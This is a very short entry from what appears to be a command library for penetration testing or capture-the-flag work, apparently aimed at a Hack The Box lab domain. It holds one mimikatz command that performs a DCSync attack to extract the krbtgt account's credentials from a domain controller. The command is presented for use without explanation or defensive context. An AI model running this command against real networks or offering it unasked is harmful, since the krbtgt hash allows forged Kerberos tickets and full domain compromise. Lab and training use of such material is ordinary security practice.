---
id: c7b55a6e-71ac-4354-b715-9ab752ded907
name: DCSync only one user for htb.local domain
type: command
executor: bash
data: mimikatz# lsadump::dcsync /domain:htb.local /user:krbtgt
output: null
created_at: '2023-04-06T03:56:04.032927+00:00'
updated_at: '2023-04-10T20:26:28.919989+00:00'
---

# DCSync only one user for htb.local domain

```bash
mimikatz# lsadump::dcsync /domain:htb.local /user:krbtgt
```


